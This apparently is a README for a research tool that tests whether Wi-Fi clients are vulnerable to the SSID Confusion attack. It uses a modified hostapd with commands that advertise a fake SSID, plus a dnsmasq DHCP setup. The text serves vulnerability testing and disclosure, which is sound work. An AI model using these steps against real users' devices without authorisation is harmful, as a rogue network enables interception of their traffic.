# SSID Confusion: Making Wi-Fi Clients Connect to the Wrong Network

## Standard Attack Test

You can test the standard attack using a single Wi-Fi dongle using our modified Hostapd.
This simulates the MC-MitM attack that would be present in a real attack.
Note that the **full MC-MitM experiment**, as used in the paper to verify an end-to-endattack,
is available in the [mc-mitm](mc-mitm-ssid/README.md) directory. The below modified Hostapd
is to more easily test whether clients are vulnerable.

To perform the standard attack test, first create the following example `hostapd_test.conf` configuration:

	interface=wlan0
	ctrl_interface=wpaspy_ctrl
	channel=1
	ssid=connectssid
	wpa_ptk_rekey=10

Now start hostapd:

	./hostapd hostapd_test.conf

**Before connecting** execute the following command:

	./hostapd_cli -p wpaspy_ctrl raw "FAKESSID changedssid"

This will simulate an MC-MITM attacker that modifies probe responses, beacons,
and association requests to advertise a different (fake) SSID. This will also
turn off beacon protection to simulate that the attacker changes the SSID in
the beacon but cannot recalculate the beacon MMIC.

After starting Hostapd, try to connect with a client to "changessid". If the
client can successfully connect to the "changedssid" then the SSID is not
verified during connection/authentication, meaning the client, and the used
authentication method, is vulnerable. The AP will perform a group key handshake
every 10 seconds. If this handshakes completes successfully, you know that the
client is (still) connected. A successful group key handshakes can be recognized
by the following debug output:

	wlan0: STA: XX:XX:XX:XX:XX:XX WPA: group key handshake completed (RSN)
	wlan0: STA: XX:XX:XX:XX:XX:XX WPA: group key handshake completed (RSN)
	wlan0: STA: XX:XX:XX:XX:XX:XX WPA: group key handshake completed (RSN)
	...

As long as this message is being shown, then the client with the given MAC address
is connected to the AP.

## Optimized Attack Test

You can use the following steps to test whether a client is affected by the
optimized attack, i.e., to test whether it checks the SSID in beacons _after_
being connected to a network.

Now connect to the created network. Once connected, you can make hostapd
advertise a different SSID using the following command:

	./hostapd_cli -p wpaspy_ctrl raw "CHANGESSID changedssid"

If the client stays connected then the client does not verify the SSID in
beacon frames one connected. Note that you can try to ping the client to
check whether it's still connected (see the client IP address in dnsmasq).

## Simple DHCP Server

To reliably test some clients, it may be required to enable DHCP. Otherwise,
some clients may automatically disconnect because the wireless network does
not provide an IP address. To easily give clients an IP address, you can
create the following `dnsmasq.conf` file:

	interface=wlan0
	dhcp-range=192.168.100.10,192.168.100.200,8h
	dhcp-option=3,192.168.100.1
	dhcp-option=6,192.168.100.1
	server=8.8.8.8
	log-queries
	log-dhcp

Now configure the IP address for `wlan0` and start dnsmasq:

	# Set IP of interface, otherwise dnsmasq will not hand out IP address.
	ip addr add 192.168.100.1/24 dev wlan0
	dnsmasq -d -C dnsmasq.conf

Note that handing out an IP address is sufficient in most cases. In case
a client requires full Internet access, you will also have to configure
Internet forwarding and NAT.
